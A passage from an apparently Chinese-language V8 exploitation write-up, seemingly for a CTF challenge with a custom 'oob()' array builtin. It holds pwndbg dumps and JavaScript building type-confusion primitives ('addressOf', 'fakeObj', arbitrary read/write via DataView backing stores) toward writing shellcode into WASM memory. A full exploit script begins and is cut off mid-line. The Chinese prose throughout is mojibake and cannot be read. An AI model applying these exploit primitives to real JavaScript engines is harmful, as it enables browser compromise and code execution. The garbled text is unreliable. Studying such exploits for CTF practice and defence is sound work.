class="line">02:0010â”‚  0x20bd84310a51 â—‚â€” 0x1000000</span><br><span class="line">03:0018â”‚  0x20bd84310a59 â—‚â€” 0x2000000</span><br><span class="line">04:0020â”‚  0x20bd84310a61 â—‚â€” 0x3000000</span><br><span class="line">05:0028â”‚  0x20bd84310a69 â—‚â€” 0x5100000004000000</span><br><span class="line">06:0030â”‚  0x20bd84310a71 â—‚â€” 0x10c0b35408</span><br><span class="line">07:0038â”‚  0x20bd84310a79 â—‚â€” 0x2900000004000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ€ªï¼Œå¯ä»¥çœ‹è§åœ¨ <code>elements</code> åˆ° <code>obj</code> çš„ä¸­é—´å­˜åœ¨ä¸€äº›æ•°æ®ï¼Œäºæ˜¯æˆ‘å¥½å¥‡å»çœ‹çœ‹è¿™æ˜¯ä»€ä¹ˆä¸œè¥¿  </p><img src="/2024/05/05/v8start/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¥½å®¶ä¼™ï¼Œå±…ç„¶è¿˜ä¼šå­˜åœ¨ä¸€ä¸ªåˆ«çš„ç»“æ„ã€‚ç®—äº†ï¼Œè¿™ä¸æ˜¯æˆ‘è¿™ä¸ªåˆå­¦è€…è¯¥äº†è§£çš„ä¸œè¥¿ï¼Œç­‰å­¦æ·±å…¥äº†å†ç ”ç©¶å§ï¼Œæš‚æ—¶ä¸å½±å“è§£é¢˜<br>æ—¢ç„¶å…¨ä¸ºæ•´æ•°çš„ <code>array</code> çš„ <code>elements</code> æ— æ³•ç´§è´´ç€ <code>obj</code>ï¼Œé‚£å­˜åœ¨æµ®ç‚¹æ•°çš„ <code>array</code> å‘¢ï¼Ÿ<code>demo</code> ä»£ç å¦‚ä¸‹ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x116059b90b21 &lt;JSArray[4]&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x116059b90b21</span><br><span class="line">0x116059b90b21: [JSArray]</span><br><span class="line"> - map: 0x0ce399302ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x07fe97a11111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x116059b90af1 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x3ffe4d400c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x062d803001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x116059b90af1 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 4</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tel 0x116059b90af1</span><br><span class="line">00:0000â”‚  0x116059b90af1 â—‚â€” 0x3ffe4d4014</span><br><span class="line">01:0008â”‚  0x116059b90af9 â—‚â€” 0x9a00000004000000</span><br><span class="line">02:0010â”‚  0x116059b90b01 â—‚â€” 0x9a3ff19999999999</span><br><span class="line">03:0018â”‚  0x116059b90b09 â—‚â€” 0x40019999999999</span><br><span class="line">04:0020â”‚  0x116059b90b11 â—‚â€” 0x40080000000000</span><br><span class="line">05:0028â”‚  0x116059b90b19 â—‚â€” 0xd940100000000000</span><br><span class="line">06:0030â”‚  0x116059b90b21 â—‚â€” 0x7100000ce399302e</span><br><span class="line">07:0038â”‚  0x116059b90b29 â—‚â€” 0xf100003ffe4d400c</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§å¸¦æµ®ç‚¹æ•°æ•°ç»„çš„ <code>elements</code> æ˜¯ç´§è´´ç€ <code>obj</code> çš„ï¼Œè¿™ç¬¦åˆæˆ‘ä»¬æ¼æ´çš„åˆ©ç”¨<br>é¦–å…ˆå°è¯•åˆ©ç”¨ä¸€ä¸‹èƒ½å¦åˆ©ç”¨è¯¥æ¼æ´æ¥æ³„éœ²å‡º <code>obj</code> ä¸­ <code>map</code> çš„å€¼  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(float_array);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="built_in">float</span> array map: 0x000029e6d51c2ed9</span><br><span class="line">0x133632fd10b1 &lt;JSArray[1]&gt;  </span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x133632fd10b1</span><br><span class="line">0x133632fd10b1: [JSArray]</span><br><span class="line"> - map: 0x29e6d51c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1dc4905d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x133632fd1099 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x097d61840c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x3faa656801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x133632fd1099 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 0.1</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æˆåŠŸçš„æ³„éœ²å‡ºäº† <code>map</code>ã€‚åŒç†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ç±»ä¼¼çš„æ–¹æ³•å»ä¿®æ”¹ <code>map</code><br>ä¸ºäº†èƒ½å¤Ÿåœ¨ <code>WASM</code> ä¸Šå†™å…¥æˆ‘ä»¬çš„ <code>shellcode</code>ï¼Œæˆ‘ä»¬éœ€è¦ä»»æ„åœ°å€å†™å’Œåœ°å€æ³„éœ²ï¼Œè¿™æ—¶å€™å°±éœ€è¦ç”¨åˆ°ç±»å‹æ··æ·†  </p><h2 id="åœ°å€æ³„éœ²"><a href="#åœ°å€æ³„éœ²" class="headerlink" title="åœ°å€æ³„éœ²"></a>åœ°å€æ³„éœ²</h2><p>åœ¨ä¸Šé¢å·²ç»è¯´è¿‡ï¼Œ<code>v8</code> æ˜¯é€šè¿‡ <code>map</code> æ‰€æŒ‡å‘çš„åŒºåŸŸæ¥åˆ¤æ–­è¯¥å¯¹è±¡æ˜¯ä»€ä¹ˆç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬å§ä¸€ä¸ªå­˜å‚¨ <code>obj</code> çš„ <code>array</code> çš„ <code>map</code> ä¿®æ”¹ä¸ºå­˜åœ¨æµ®ç‚¹æ•°æ•°ç»„çš„ <code>map</code>ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±èƒ½å¤Ÿç›´æ¥è·å–åˆ°è¯¥å¯¹è±¡çš„åœ°å€ã€‚æˆ‘ä»¬å¯ä»¥å°†è¯¥åŸè¯­å°è£…æˆä¸€ä¸ª <code>addressOf</code> å‡½æ•°  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>addressOf</code> å‡½æ•°çš„åŠŸèƒ½ä¸ºè·å–æŒ‡å®šå¯¹è±¡ <code>obj</code> çš„åœ°å€ï¼Œå»ºè®®è¯»è€…ä»”ç»†é˜…è¯»å’Œç†è§£è¯¥å‡½æ•°çš„å®ç°åŸç†<br>åŒç†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ç±»ä¼¼çš„æ€è·¯æ¥å®ç°ä»»æ„åœ°å€çš„å†™ï¼Œä¸è¿‡æœ‰ä¸€ç‚¹ç‚¹ç»•  </p><h2 id="ä»»æ„åœ°å€å†™"><a href="#ä»»æ„åœ°å€å†™" class="headerlink" title="ä»»æ„åœ°å€å†™"></a>ä»»æ„åœ°å€å†™</h2><p>ä»»æ„åœ°å€å†™çš„æ€æƒ³ä¸ºä¼ªé€ ä¸€ä¸ª <code>object</code>ï¼Œæ ¹æ®ç±»å‹æ··æ·†å¯ä»¥å°†è¯¥åŸè¯­å°è£…æˆä¸€ä¸ªå‡½æ•°ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æ˜¯å¸Œæœ›è¯»è€…å¯ä»¥è‡ªè¡Œæ€è€ƒå’Œç†è§£è¯¥åŸè¯­æ˜¯å¦‚ä½•å®ç°ä¼ªé€  <code>object</code> çš„ã€‚<br>æˆ‘ä»¬ä¼ªé€ çš„ <code>object</code> æ˜¯åœ¨ <code>elements</code> ä¸Šé¢çš„ï¼Œè€Œ <code>elements</code> ä¸Šçš„æ•°æ®æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ç…§å¦‚ä¸‹æ ·å¼ä¼ªé€ ä¸€ä¸ªå­˜åœ¨æµ®ç‚¹æ•°çš„ <code>object</code>  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">// æ²¡æœ‰åŸå‹</span></span><br><span class="line">    <span class="title function_">u2d</span>(target - <span class="number">0x10n</span>),  <span class="comment">// fake elements ptr</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),  <span class="comment">// fake length</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼ªé€ çš„æ˜¯ä¸€ä¸ªæ²¡æœ‰åŸå‹çš„å­˜åœ¨æµ®ç‚¹æ•°çš„ <code>objcet</code>ï¼Œ<code>target</code> ä¸ºæˆ‘ä»¬æƒ³è¦è¿›è¡Œå†™çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ä¼ªé€ çš„ <code>elements</code><br>æˆ‘ä»¬å¯ä»¥åœ¨æ³„éœ²å‡º <code>float_array_mem</code> çš„åœ°å€åé€šè¿‡ <code>fakeObj(fake_obj_addr)</code> å‡½æ•°æ¥è·å–æˆ‘ä»¬çš„ <code>fake object</code>ï¼Œç„¶åå‘ <code>target</code> å†™å…¥æ•°æ®ã€‚è‡³äºä¸ºä»€ä¹ˆ <code>target</code> è¦ <code>-0x10</code> å‘¢ï¼Œå› ä¸º <code>elements</code> ä¸Šé¢æœ‰ <code>0x10</code> å­—èŠ‚ç”¨äºå­˜å‚¨ <code>map</code> å’Œ <code>length</code><br>æœ‰äº†å¯¹è±¡åœ°å€æ³„éœ²å’Œä»»æ„åœ°å€å†™ï¼Œæˆ‘ä»¬å°±ä»¥ä¸ºèƒ½å¤Ÿåœ¨ <code>WASM</code> ä¸Šæ„‰å¿«çš„å†™ <code>shellcode</code> äº†ï¼Œå¯äº‹æƒ…å¹¶æ²¡æœ‰è¿™ä¹ˆç®€å•ï¼Œå³åœ¨å†™ <code>0x7fxxxxx</code> è¿™æ ·çš„é«˜åœ°å€çš„æ—¶å€™ä¼šå‡ºç°é—®é¢˜ï¼Œåœ°å€çš„ä½ä½ä¼šè¢«ä¿®æ”¹ï¼Œå¯¼è‡´å‡ºç°è®¿é—®å¼‚å¸¸ã€‚å› ä¸ºå†™åŸè¯­ä½¿ç”¨çš„æ˜¯ <code>FloatArray</code> çš„å†™å…¥æ“ä½œï¼Œè€Œ <code>Double</code> ç±»å‹çš„æµ®ç‚¹æ•°æ•°ç»„åœ¨å¤„ç† <code>7f</code> å¼€å¤´çš„é«˜åœ°å€æ—¶ä¼šå‡ºç°å°†ä½ <code>20</code> ä½ä¸è¿ç®—ä¸º <code>0</code><br>è¿™æ—¶å€™æˆ‘ä»¬å°±è¦ä½¿ç”¨ <code>DataView </code>å¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„ç»“æ„å¦‚ä¸‹ï¼š  </p><img src="/2024/05/05/v8start/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™æ˜¯ç”¨æ¥è¯»å†™ <code>ArrayBuffer</code> çš„ <code>BackingStore</code> çš„å†…å®¹çš„å¯¹è±¡ï¼Œåœ¨ <code>exploit</code> é‡Œå¸¸ç”¨ä½œæœ€åçš„ä»»æ„åœ°å€è¯»å†™åŸè¯­çš„æ„é€ ã€‚<br>å¯ä»¥çœ‹è§è¿™ä¸ª <code>DataView</code> å¤šäº†ä¸€ä¸ª <code>BackingStore</code>ã€‚<code>DataView</code> å¯¹è±¡ä¸­çš„ <code>backing_store</code> ä¼šæŒ‡å‘ç”³è¯·çš„ <code>data_buf</code> (<code>backing_store</code> ç›¸å½“äºæˆ‘ä»¬çš„ <code>elements</code>)ï¼Œä¿®æ”¹ <code>backing_store</code> ä¸ºæˆ‘ä»¬æƒ³è¦å†™çš„åœ°å€ï¼Œå¹¶é€šè¿‡ <code>DataView</code> å¯¹è±¡çš„ <code>setBigUint64</code> æ–¹æ³•å°±å¯ä»¥å¾€æŒ‡å®šåœ°å€æ­£å¸¸å†™å…¥æ•°æ®äº†ã€‚<br>é‚£ç°åœ¨æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼Œé¦–å…ˆç”³è¯· <code>2</code> ä¸ª <code>ArrayBuffer</code> å¯¹è±¡ <code>ab1</code>ã€<code>ab2</code>ï¼Œç”³è¯·ä»–ä»¬å„è‡ªçš„ <code>DataView</code> å¯¹è±¡ <code>dv1</code>ã€<code>dv2</code>ã€‚å°†ä¼ªé€ çš„ <code>fakeobj</code> çš„ <code>elements</code> æŒ‡å‘ <code>dv1</code> çš„ <code>BackingStore-0x10</code>ï¼Œå†é€šè¿‡ä¿®æ”¹ <code>fakeobj</code> ä»¤ <code>dv1</code> çš„ <code>BackingStore</code> æŒ‡å‘ <code>dv2</code> çš„ <code>BackingStore-0x10</code><br>æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ <code>fakeobj</code> æ¥ä¿®æ”¹ <code>dv2</code> <code>BackingStore</code> å¤„çš„å€¼ï¼Œæœ€åé€šè¿‡ <code>dv2</code> çš„å†…ç½®å‡½æ•°æ¥å®ç°ä»»æ„åœ°å€çš„è¯»å†™ã€‚æé†’ä¸€ä¸‹ï¼Œè¿™é‡Œè¦åŒºåˆ†å¼€ <code>BackingStore</code> çš„åœ°å€å’Œ <code>BackingStore</code> åœ°å€å‡ºçš„å€¼è¿™2ä¸ªæ¦‚å¿µã€‚åŸè¯­å°è£…å‡½æ•°å¦‚ä¸‹ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ab1 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> ab2 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> dv1 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab1);</span><br><span class="line"><span class="keyword">var</span> dv2 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab2);</span><br><span class="line"><span class="keyword">var</span> ab1_bs_addr = <span class="title function_">addressOf</span>(ab1) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="keyword">var</span> 